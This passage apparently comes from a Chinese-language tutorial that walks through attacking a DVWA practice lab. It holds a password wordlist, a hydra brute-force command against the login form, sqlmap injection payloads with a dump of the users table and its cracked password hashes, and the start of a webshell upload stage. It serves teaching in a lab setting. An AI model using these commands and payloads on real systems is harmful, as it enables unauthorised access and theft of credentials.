</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span><span class="lnt">341
</span><span class="lnt">342
</span><span class="lnt">343
</span><span class="lnt">344
</span><span class="lnt">345
</span><span class="lnt">346
</span><span class="lnt">347
</span><span class="lnt">348
</span><span class="lnt">349
</span><span class="lnt">350
</span><span class="lnt">351
</span><span class="lnt">352
</span><span class="lnt">353
</span><span class="lnt">354
</span><span class="lnt">355
</span><span class="lnt">356
</span><span class="lnt">357
</span><span class="lnt">358
</span><span class="lnt">359
</span><span class="lnt">360
</span><span class="lnt">361
</span><span class="lnt">362
</span><span class="lnt">363
</span><span class="lnt">364
</span><span class="lnt">365
</span><span class="lnt">366
</span><span class="lnt">367
</span><span class="lnt">368
</span><span class="lnt">369
</span><span class="lnt">370
</span><span class="lnt">371
</span><span class="lnt">372
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">12345
</span></span><span class="line"><span class="cl">123456789
</span></span><span class="line"><span class="cl">Password
</span></span><span class="line"><span class="cl">iloveyou
</span></span><span class="line"><span class="cl">princess
</span></span><span class="line"><span class="cl">rockyou
</span></span><span class="line"><span class="cl">1234567
</span></span><span class="line"><span class="cl">12345678
</span></span><span class="line"><span class="cl">abc123
</span></span><span class="line"><span class="cl">admin888
</span></span><span class="line"><span class="cl">admin123
</span></span><span class="line"><span class="cl">test
</span></span><span class="line"><span class="cl">password
</span></span><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">a123456
</span></span><span class="line"><span class="cl">123456a
</span></span><span class="line"><span class="cl">5201314
</span></span><span class="line"><span class="cl">111111
</span></span><span class="line"><span class="cl">woaini1314
</span></span><span class="line"><span class="cl">qq123456
</span></span><span class="line"><span class="cl">123123
</span></span><span class="line"><span class="cl">0
</span></span><span class="line"><span class="cl">1qaz2wsx
</span></span><span class="line"><span class="cl">1q2w3e4r
</span></span><span class="line"><span class="cl">qwe123
</span></span><span class="line"><span class="cl">7758521
</span></span><span class="line"><span class="cl">123qwe
</span></span><span class="line"><span class="cl">a123123
</span></span><span class="line"><span class="cl">123456aa
</span></span><span class="line"><span class="cl">woaini520        
</span></span><span class="line"><span class="cl">woaini
</span></span><span class="line"><span class="cl">100200
</span></span><span class="line"><span class="cl">1314520
</span></span><span class="line"><span class="cl">woaini123
</span></span><span class="line"><span class="cl">123321
</span></span><span class="line"><span class="cl">q123456
</span></span><span class="line"><span class="cl">123456789
</span></span><span class="line"><span class="cl">123456789a
</span></span><span class="line"><span class="cl">5211314
</span></span><span class="line"><span class="cl">asd123
</span></span><span class="line"><span class="cl">a123456789
</span></span><span class="line"><span class="cl">z123456
</span></span><span class="line"><span class="cl">asd123456
</span></span><span class="line"><span class="cl">a5201314
</span></span><span class="line"><span class="cl">aa123456
</span></span><span class="line"><span class="cl">zhang123
</span></span><span class="line"><span class="cl">aptx4869
</span></span><span class="line"><span class="cl">123123a
</span></span><span class="line"><span class="cl">1q2w3e4r5t
</span></span><span class="line"><span class="cl">1qazxsw2
</span></span><span class="line"><span class="cl">5201314a
</span></span><span class="line"><span class="cl">1q2w3e
</span></span><span class="line"><span class="cl">aini1314
</span></span><span class="line"><span class="cl">31415926
</span></span><span class="line"><span class="cl">q1w2e3r4
</span></span><span class="line"><span class="cl">123456qq
</span></span><span class="line"><span class="cl">woaini521
</span></span><span class="line"><span class="cl">1234qwer
</span></span><span class="line"><span class="cl">a111111
</span></span><span class="line"><span class="cl">520520
</span></span><span class="line"><span class="cl">iloveyou
</span></span><span class="line"><span class="cl">abc123 
</span></span><span class="line"><span class="cl">110110
</span></span><span class="line"><span class="cl">111111a          
</span></span><span class="line"><span class="cl">123456abc        
</span></span><span class="line"><span class="cl">w123456
</span></span><span class="line"><span class="cl">7758258
</span></span><span class="line"><span class="cl">123qweasd
</span></span><span class="line"><span class="cl">159753
</span></span><span class="line"><span class="cl">qwer1234
</span></span><span class="line"><span class="cl">a000000
</span></span><span class="line"><span class="cl">qq123123
</span></span><span class="line"><span class="cl">zxc123
</span></span><span class="line"><span class="cl">123654
</span></span><span class="line"><span class="cl">abc123456
</span></span><span class="line"><span class="cl">123456q
</span></span><span class="line"><span class="cl">qq5201314
</span></span><span class="line"><span class="cl">12345678
</span></span><span class="line"><span class="cl">000000a          
</span></span><span class="line"><span class="cl">456852
</span></span><span class="line"><span class="cl">as123456
</span></span><span class="line"><span class="cl">1314521          
</span></span><span class="line"><span class="cl">112233
</span></span><span class="line"><span class="cl">521521
</span></span><span class="line"><span class="cl">qazwsx123
</span></span><span class="line"><span class="cl">zxc123456
</span></span><span class="line"><span class="cl">abcd1234
</span></span><span class="line"><span class="cl">asdasd
</span></span><span class="line"><span class="cl">666666
</span></span><span class="line"><span class="cl">love1314
</span></span><span class="line"><span class="cl">QAZ123
</span></span><span class="line"><span class="cl">aaa123
</span></span><span class="line"><span class="cl">q1w2e3
</span></span><span class="line"><span class="cl">aaaaaa
</span></span><span class="line"><span class="cl">a123321
</span></span><span class="line"><span class="cl">123000
</span></span><span class="line"><span class="cl">11111111
</span></span><span class="line"><span class="cl">12qwaszx
</span></span><span class="line"><span class="cl">5845201314
</span></span><span class="line"><span class="cl">s123456
</span></span><span class="line"><span class="cl">nihao123
</span></span><span class="line"><span class="cl">caonima123
</span></span><span class="line"><span class="cl">zxcvbnm123
</span></span><span class="line"><span class="cl">wang123
</span></span><span class="line"><span class="cl">159357
</span></span><span class="line"><span class="cl">1A2B3C4D
</span></span><span class="line"><span class="cl">asdasd123
</span></span><span class="line"><span class="cl">584520
</span></span><span class="line"><span class="cl">753951
</span></span><span class="line"><span class="cl">147258
</span></span><span class="line"><span class="cl">1123581321
</span></span><span class="line"><span class="cl">110120
</span></span><span class="line"><span class="cl">qq1314520        
</span></span><span class="line"><span class="cl">123456.com
</span></span><span class="line"><span class="cl">123123
</span></span><span class="line"><span class="cl">idc123!@#
</span></span><span class="line"><span class="cl">123
</span></span><span class="line"><span class="cl">aaa123!@#
</span></span><span class="line"><span class="cl">qq123.com
</span></span><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">wantian##*(
</span></span><span class="line"><span class="cl">qwe123
</span></span><span class="line"><span class="cl">qwe1234
</span></span><span class="line"><span class="cl">123qwe
</span></span><span class="line"><span class="cl">123qwer
</span></span><span class="line"><span class="cl">1qaz2wsx
</span></span><span class="line"><span class="cl">1qaz
</span></span><span class="line"><span class="cl">159753
</span></span><span class="line"><span class="cl">!Q@W#E
</span></span><span class="line"><span class="cl">159357
</span></span><span class="line"><span class="cl">147369
</span></span><span class="line"><span class="cl">1234567
</span></span><span class="line"><span class="cl">password
</span></span><span class="line"><span class="cl">aistar123&lt;&gt;!N
</span></span><span class="line"><span class="cl">321
</span></span><span class="line"><span class="cl">idcji2010
</span></span><span class="line"><span class="cl">qqqqqq
</span></span><span class="line"><span class="cl">1q2w3e
</span></span><span class="line"><span class="cl">q1w2e3
</span></span><span class="line"><span class="cl">336699
</span></span><span class="line"><span class="cl">abc123
</span></span><span class="line"><span class="cl">asd123
</span></span><span class="line"><span class="cl">123654
</span></span><span class="line"><span class="cl">1
</span></span><span class="line"><span class="cl">111111
</span></span><span class="line"><span class="cl">111
</span></span><span class="line"><span class="cl">111qqq...
</span></span><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">953139.
</span></span><span class="line"><span class="cl">0258
</span></span><span class="line"><span class="cl">111qqq!!!
</span></span><span class="line"><span class="cl">1236
</span></span><span class="line"><span class="cl">qqii
</span></span><span class="line"><span class="cl">tyinfo
</span></span><span class="line"><span class="cl">abcd36888
</span></span><span class="line"><span class="cl">rst_login
</span></span><span class="line"><span class="cl">OAOidc
</span></span><span class="line"><span class="cl">OAOidc123!@#
</span></span><span class="line"><span class="cl">OAOidc123
</span></span><span class="line"><span class="cl">esin888
</span></span><span class="line"><span class="cl">qwer
</span></span><span class="line"><span class="cl">power123
</span></span><span class="line"><span class="cl">power.liu
</span></span><span class="line"><span class="cl">power.yu
</span></span><span class="line"><span class="cl">dns99+588
</span></span><span class="line"><span class="cl">zhengui
</span></span><span class="line"><span class="cl">idc0.1
</span></span><span class="line"><span class="cl">7715123
</span></span><span class="line"><span class="cl">sdwer
</span></span><span class="line"><span class="cl">power.zhao
</span></span><span class="line"><span class="cl">sdwer123
</span></span><span class="line"><span class="cl">qwer1234
</span></span><span class="line"><span class="cl">esincs
</span></span><span class="line"><span class="cl">jspower123.0
</span></span><span class="line"><span class="cl">5656789
</span></span><span class="line"><span class="cl">2323456
</span></span><span class="line"><span class="cl">power.com
</span></span><span class="line"><span class="cl">power123.0
</span></span><span class="line"><span class="cl">power0.123
</span></span><span class="line"><span class="cl">jspower.com
</span></span><span class="line"><span class="cl">123123
</span></span><span class="line"><span class="cl">hlwj0519-1205.jf
</span></span><span class="line"><span class="cl">123321
</span></span><span class="line"><span class="cl">zaxscdvf
</span></span><span class="line"><span class="cl">..0
</span></span><span class="line"><span class="cl">!@#$QWER
</span></span><span class="line"><span class="cl">95313
</span></span><span class="line"><span class="cl">1231321
</span></span><span class="line"><span class="cl">321123
</span></span><span class="line"><span class="cl">vipnew
</span></span><span class="line"><span class="cl">idc0514
</span></span><span class="line"><span class="cl">1235698
</span></span><span class="line"><span class="cl">235689
</span></span><span class="line"><span class="cl">326598
</span></span><span class="line"><span class="cl">112233
</span></span><span class="line"><span class="cl">111222
</span></span><span class="line"><span class="cl">qqqqqq
</span></span><span class="line"><span class="cl">idc11
</span></span><span class="line"><span class="cl">21vianet
</span></span><span class="line"><span class="cl">#@!ewq
</span></span><span class="line"><span class="cl">1010
</span></span><span class="line"><span class="cl">111qqq
</span></span><span class="line"><span class="cl">1234%^&amp;*
</span></span><span class="line"><span class="cl">12345^&amp;*()
</span></span><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">4867086
</span></span><span class="line"><span class="cl">1234567
</span></span><span class="line"><span class="cl">123!@#
</span></span><span class="line"><span class="cl">123456!@#
</span></span><span class="line"><span class="cl">10000
</span></span><span class="line"><span class="cl">794613
</span></span><span class="line"><span class="cl">784512
</span></span><span class="line"><span class="cl">895623
</span></span><span class="line"><span class="cl">789456
</span></span><span class="line"><span class="cl">456123
</span></span><span class="line"><span class="cl">654321
</span></span><span class="line"><span class="cl">123!@#
</span></span><span class="line"><span class="cl">1234!@#$
</span></span><span class="line"><span class="cl">11185
</span></span><span class="line"><span class="cl">12345!@#$%
</span></span><span class="line"><span class="cl">qwe123!@#
</span></span><span class="line"><span class="cl">!@#123
</span></span><span class="line"><span class="cl">!@#321
</span></span><span class="line"><span class="cl">123#@!
</span></span><span class="line"><span class="cl">19861212
</span></span><span class="line"><span class="cl">19831212
</span></span><span class="line"><span class="cl">19841020
</span></span><span class="line"><span class="cl">#@!123
</span></span><span class="line"><span class="cl">#@!321
</span></span><span class="line"><span class="cl">idcidc
</span></span><span class="line"><span class="cl">12345^&amp;*()
</span></span><span class="line"><span class="cl">!@#$%^&amp;*()
</span></span><span class="line"><span class="cl">)(*&amp;^%$#@!
</span></span><span class="line"><span class="cl">0987654321
</span></span><span class="line"><span class="cl">tyidc
</span></span><span class="line"><span class="cl">1122
</span></span><span class="line"><span class="cl">111222
</span></span><span class="line"><span class="cl">idc123
</span></span><span class="line"><span class="cl">idcidcok
</span></span><span class="line"><span class="cl">idcuser
</span></span><span class="line"><span class="cl">abcd1234
</span></span><span class="line"><span class="cl">1234abcd
</span></span><span class="line"><span class="cl">caonima
</span></span><span class="line"><span class="cl">1q2w3e4r
</span></span><span class="line"><span class="cl">888888
</span></span><span class="line"><span class="cl">admin!@#
</span></span><span class="line"><span class="cl">abc!@#
</span></span><span class="line"><span class="cl">!Q@W#E$R%T
</span></span><span class="line"><span class="cl">idc2010
</span></span><span class="line"><span class="cl">1236
</span></span><span class="line"><span class="cl">1q2w3e4r5t
</span></span><span class="line"><span class="cl">qqaazz
</span></span><span class="line"><span class="cl">asdasd
</span></span><span class="line"><span class="cl">admin
</span></span><span class="line"><span class="cl">admin1
</span></span><span class="line"><span class="cl">admin123
</span></span><span class="line"><span class="cl">aaa111
</span></span><span class="line"><span class="cl">111aaa
</span></span><span class="line"><span class="cl">123aaa
</span></span><span class="line"><span class="cl">lh222
</span></span><span class="line"><span class="cl">lhidc
</span></span><span class="line"><span class="cl">123a
</span></span><span class="line"><span class="cl">a123
</span></span><span class="line"><span class="cl">123456a
</span></span><span class="line"><span class="cl">a123456
</span></span><span class="line"><span class="cl">aaa123
</span></span><span class="line"><span class="cl">qazwsx
</span></span><span class="line"><span class="cl">qazxsw
</span></span><span class="line"><span class="cl">0123
</span></span><span class="line"><span class="cl">123112233
</span></span><span class="line"><span class="cl">123111
</span></span><span class="line"><span class="cl">www.7x24.cn
</span></span><span class="line"><span class="cl">shisp.net
</span></span><span class="line"><span class="cl">123000
</span></span><span class="line"><span class="cl">idc0123
</span></span><span class="line"><span class="cl">1230..
</span></span><span class="line"><span class="cl">123456789
</span></span><span class="line"><span class="cl">123456qwe
</span></span><span class="line"><span class="cl">123qwe
</span></span><span class="line"><span class="cl">12345qwert
</span></span><span class="line"><span class="cl">zxcvbnm
</span></span><span class="line"><span class="cl">qwerty
</span></span><span class="line"><span class="cl">qweqwe
</span></span><span class="line"><span class="cl">q1w2e3
</span></span><span class="line"><span class="cl">123ewq
</span></span><span class="line"><span class="cl">qwe321
</span></span><span class="line"><span class="cl">1qazxsw2
</span></span><span class="line"><span class="cl">12qwaszx
</span></span><span class="line"><span class="cl">1234rewq
</span></span><span class="line"><span class="cl">123456.com
</span></span><span class="line"><span class="cl">lituobestsanmao
</span></span><span class="line"><span class="cl">!@#19841010
</span></span><span class="line"><span class="cl">msfadmin
</span></span><span class="line"><span class="cl">19885510
</span></span><span class="line"><span class="cl">xyidc_2006
</span></span><span class="line"><span class="cl">95217189
</span></span><span class="line"><span class="cl">95217
</span></span><span class="line"><span class="cl">chinayixun
</span></span><span class="line"><span class="cl">huachen1258zz
</span></span><span class="line"><span class="cl">sanhe123
</span></span><span class="line"><span class="cl">3H8IDC!!#
</span></span><span class="line"><span class="cl">3H8IDC72sanhe000
</span></span><span class="line"><span class="cl">xiaoyili
</span></span><span class="line"><span class="cl">sanhe000~!@#  
</span></span><span class="line"><span class="cl">3H8IDC!!#
</span></span><span class="line"><span class="cl">ccfeng66131421  
</span></span><span class="line"><span class="cl">!@#59560955
</span></span><span class="line"><span class="cl">tkggja850518`1
</span></span><span class="line"><span class="cl">zhengui
</span></span><span class="line"><span class="cl">anada325!@#
</span></span><span class="line"><span class="cl">www.txwscx.comsritgyxf2sxy19831122zx
</span></span><span class="line"><span class="cl">ZHONGGUO$#@!999@
</span></span><span class="line"><span class="cl">admin13906271234
</span></span><span class="line"><span class="cl">395835961
</span></span><span class="line"><span class="cl">senlinyan
</span></span><span class="line"><span class="cl">3203672
</span></span><span class="line"><span class="cl">9527999!!!
</span></span><span class="line"><span class="cl">P@ssw0rd
</span></span><span class="line"><span class="cl">huaiyukeji115
</span></span><span class="line"><span class="cl">idc9aewr42
</span></span><span class="line"><span class="cl">idc0.1
</span></span><span class="line"><span class="cl">123asdasd
</span></span><span class="line"><span class="cl">qsx6059410172.
</span></span><span class="line"><span class="cl">idc0001
</span></span><span class="line"><span class="cl">idc800888
</span></span><span class="line"><span class="cl">idc46121
</span></span><span class="line"><span class="cl">123asdasd
</span></span><span class="line"><span class="cl">882627.8
</span></span><span class="line"><span class="cl">luofei520!@#123
</span></span><span class="line"><span class="cl">852799!!!
</span></span><span class="line"><span class="cl">idc0123.0
</span></span><span class="line"><span class="cl">513tyml.com
</span></span><span class="line"><span class="cl">abc123!@#
</span></span><span class="line"><span class="cl">1q2w3e,./? &gt;&lt;
</span></span><span class="line"><span class="cl">6504710shuazuan
</span></span><span class="line"><span class="cl">123.789+
</span></span><span class="line"><span class="cl">123asdasd
</span></span><span class="line"><span class="cl">752883855.
</span></span><span class="line"><span class="cl">senlinyan$
</span></span><span class="line"><span class="cl">admin001
</span></span><span class="line"><span class="cl">6695zx
</span></span><span class="line"><span class="cl">scictd9821622
</span></span><span class="line"><span class="cl">365obsserver!
</span></span><span class="line"><span class="cl">ranglm123456
</span></span><span class="line"><span class="cl">13920225257
</span></span><span class="line"><span class="cl">idc925111
</span></span><span class="line"><span class="cl">1qaz@wsx#edc
</span></span><span class="line"><span class="cl">.......199
</span></span><span class="line"><span class="cl">xu15817079919
</span></span><span class="line"><span class="cl">yanjin0429
</span></span><span class="line"><span class="cl">zhangznw
</span></span><span class="line"><span class="cl">13527380230
</span></span><span class="line"><span class="cl">idc0.01
</span></span><span class="line"><span class="cl">idc123&amp;123
</span></span><span class="line"><span class="cl">662766
</span></span><span class="line"><span class="cl">122.224
</span></span><span class="line"><span class="cl">huaiyukeji115
</span></span><span class="line"><span class="cl">.......199@
</span></span><span class="line"><span class="cl">liuzhangzi1988
</span></span><span class="line"><span class="cl">123456!@#$%^
</span></span><span class="line"><span class="cl">idc0123
</span></span><span class="line"><span class="cl">dahouzi110
</span></span><span class="line"><span class="cl">123.789+
</span></span><span class="line"><span class="cl">trista188#**
</span></span><span class="line"><span class="cl">mm1237
</span></span><span class="line"><span class="cl">07736056123
</span></span><span class="line"><span class="cl">TnHoo15862380404
</span></span><span class="line"><span class="cl">idc0123
</span></span><span class="line"><span class="cl">189532210113
</span></span><span class="line"><span class="cl">idc123
</span></span><span class="line"><span class="cl">gedingfeng1102888
</span></span></code></pre></td></tr></table>
</div>
</div><p>以及你需要把上面抓到的<code>username=admin&amp;password=6666666666&amp;Login=Login</code>和<code>Login failed</code>整合一下变成这样:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed
</span></span></code></pre></td></tr></table>
</div>
</div><p>整合一下，需要执行的指令就是下面这个了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ hydra -l admin -P ./密码字典/pass-wake.txt -V -e ns 192.168.0.4 http-post-form <span class="s2">&#34;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>它很快就会给你破解出来</p>
<p></p>
<p></p>
<p>由上图可看出，密码就是<code>password</code></p>
<p>接下来我们尝试登录</p>
<p></p>
<p>如果成功登录，出现了这个页面，那么恭喜你，第一关完美通过
</p>
<h3 id="第二关简单sql注入">第二关|简单SQL注入</h3>
<p>第一关过了以后，我们要看看它的数据库里面有什么</p>
<h4 id="抓包-1">抓包</h4>
<p>我们回到他这个网页，先进入<code>DVWA Security</code>，把安全等级改成<code>Low</code></p>
<p></p>
<p>再点击<code>SQL Injection</code>这个按钮，进入这个页面。</p>
<p></p>
<p>接下来打开burp，按照之前的操作一样，监听，抓包什么的（这里我上面写得很详细了）</p>
<p>在burpsuite的监听下，在这个输入框里随便输入一些内容，然后点击这个<code>Submit</code>按钮，Burp就会自动抓包了</p>
<p></p>
<p>将它保存为一个txt文件，但是要记住它的位置，比如我的是<code>~/get.txt</code></p>
<p></p>
<p>这样抓包工作就完成了。</p>
<h4 id="使用sqlmap注入">使用sqlmap注入</h4>
<p>接下来用到的工具就是sqlmap了，这里只写出注入的流程，具体的教程请参考由帝的视频</p>
<p>我们先扫描一下注入点</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sqlmap -r <span class="s2">&#34;get.txt&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p></p>
<p>这里均选<code>y</code>即可。</p>
<p></p>
<p>最后一个选项选<code>n</code>不必浪费时间了。</p>
<p></p>
<p>接下来我们就获得我们需要的信息了，数据库版本什么的。我把它贴出来吧。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sqlmap identified the following injection point(s) with a total of 149 HTTP(s) requests:
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">Parameter: id (GET)
</span></span><span class="line"><span class="cl">    Type: boolean-based blind
</span></span><span class="line"><span class="cl">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
</span></span><span class="line"><span class="cl">    Payload: id=6666666&#39; OR NOT 1144=1144#&amp;Submit=Submit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Type: error-based
</span></span><span class="line"><span class="cl">    Title: MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
</span></span><span class="line"><span class="cl">    Payload: id=6666666&#39; OR ROW(6268,9799)&gt;(SELECT COUNT(*),CONCAT(0x7162786b71,(SELECT (ELT(6268=6268,1))),0x716a767071,FLOOR(RAND(0)*2))x FROM (SELECT 9569 UNION SELECT 7660 UNION SELECT 7717 UNION SELECT 8645)a GROUP BY x)-- dPXL&amp;Submit=Submit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Type: time-based blind
</span></span><span class="line"><span class="cl">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
</span></span><span class="line"><span class="cl">    Payload: id=6666666&#39; AND (SELECT 4811 FROM (SELECT(SLEEP(5)))hDuM)-- SMOw&amp;Submit=Submit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Type: UNION query
</span></span><span class="line"><span class="cl">    Title: MySQL UNION query (NULL) - 2 columns
</span></span><span class="line"><span class="cl">    Payload: id=6666666&#39; UNION ALL SELECT NULL,CONCAT(0x7162786b71,0x794f4b67535851624375466379624550476a6243584e4b754d7250524e524d7a6c70587370704877,0x716a767071)#&amp;Submit=Submit
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">[13:19:30] [INFO] the back-end DBMS is MySQL
</span></span><span class="line"><span class="cl">back-end DBMS: MySQL &gt;= 4.1
</span></span><span class="line"><span class="cl">[13:19:30] [INFO] fetched data logged to text files under &#39;/home/weepingdogel/.sqlmap/output/192.168.0.105&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来我们就要查看数据库里面的内容了，由于原因，我就不贴出逐级查看的代码了，我直接dump</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sqlmap -r <span class="s2">&#34;~/get.txt&#34;</span> --dump
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p>出来了。</p>
<p>如果你终端里获取到了以下信息，那么说明，第二关通过了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Database: dvwa
</span></span><span class="line"><span class="cl">Table: users
</span></span><span class="line"><span class="cl">[5 entries]
</span></span><span class="line"><span class="cl">+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
</span></span><span class="line"><span class="cl">| user_id | user    | avatar                                                | password                                    | last_name | first_name |
</span></span><span class="line"><span class="cl">+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
</span></span><span class="line"><span class="cl">| 1       | admin   | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      |
</span></span><span class="line"><span class="cl">| 2       | gordonb | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     |
</span></span><span class="line"><span class="cl">| 3       | 1337    | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       |
</span></span><span class="line"><span class="cl">| 4       | pablo   | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      |
</span></span><span class="line"><span class="cl">| 5       | smithy  | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        |
</span></span><span class="line"><span class="cl">+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="第三关操作系统渗透">第三关|操作系统渗透</h3>
<p>Well,</p>
<p>接下来我们就要进行最关键的一环了，我们将使用Webshell的方式入侵靶机的操作系统。</p>
<p>知道PHP吗？我对它了解也不是很多，总之它可以被上传到服务器然后以可执行文件的方式运行。</p>
<p>这次也将使用PHP文件作为<strong>木马</strong>进行攻击。</p>
